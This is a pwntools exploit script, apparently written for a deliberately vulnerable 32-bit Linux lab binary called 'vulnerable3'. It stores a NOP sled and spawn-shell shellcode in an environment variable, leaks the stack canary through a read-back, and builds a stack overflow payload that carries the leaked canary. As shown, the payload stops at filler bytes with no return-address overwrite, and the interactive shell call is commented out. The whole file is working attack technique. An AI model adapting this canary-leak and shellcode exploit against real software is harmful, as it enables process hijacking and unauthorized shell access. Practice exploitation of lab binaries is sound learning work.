#!/usr/bin/env python
from pwn import *

# 32 bit linux
context(arch='i386', os='linux')

# Generate vars
nopsled = "\x90" * 100
sc = asm(shellcraft.sh())
canary_offset = 4

# Generate process, with SHELLCODE env var
p = process('./vulnerable3', env={ 'SHELLCODE' : nopsled + sc })

# Leak canary
p.send('ABCD\n')
canary = p.recv()[4:8]
canary = unpack(canary, 'all', endian='little', sign=False) - 0xa
canary = p32(canary)

log.info("canary is: 0x{:08x}".format(unpack(canary, 'all', endian='little', sign=False)))

# Craft payload
payload = "A" * canary_offset
payload += canary
payload += "E" * 16

# Send payload
p.send(payload)

# p.interactive()